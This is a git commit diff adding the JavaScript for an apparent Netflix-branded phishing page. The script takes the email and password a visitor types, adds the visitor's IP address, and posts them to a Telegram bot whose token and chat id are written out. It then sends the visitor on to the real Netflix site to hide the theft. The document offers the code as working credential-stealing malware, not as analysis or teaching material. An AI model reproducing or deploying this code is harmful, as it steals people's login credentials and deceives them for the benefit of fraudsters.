2269a4711ddaa20812050fd2eeb204ca02aefb57
Saikumar Shetty <73155077+Shettysai@users.noreply.github.com>
2022-08-15 01:28:22 +0530

    Update script.js

--- js/script.js
+++ js/script.js
@@ -1,1 +1,30 @@
 //
+
+const inputEmail = document.getElementById("inputEmail")
+const inputPassword = document.getElementById("inputPassword")
+const signin = document.getElementById("signin")
+let ip ='Not Found'
+
+fetch('https://api.db-ip.com/v2/free/self')
+    .then(result => result.json())
+    .then((output) => {
+        ip = output;
+        
+}).catch(err => console.error(err));
+
+
+signin.addEventListener("click", async (ev)=>{
+            ev.preventDefault();
+            console.log("signing in...");
+                const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`NETFLIX  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`
+    fetch(url, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: ''
+    }).then(res => {
+        console.log("Request complete!");
+    });
+            location.href = "https://www.netflix.com";
+            return false;
+        }
+);
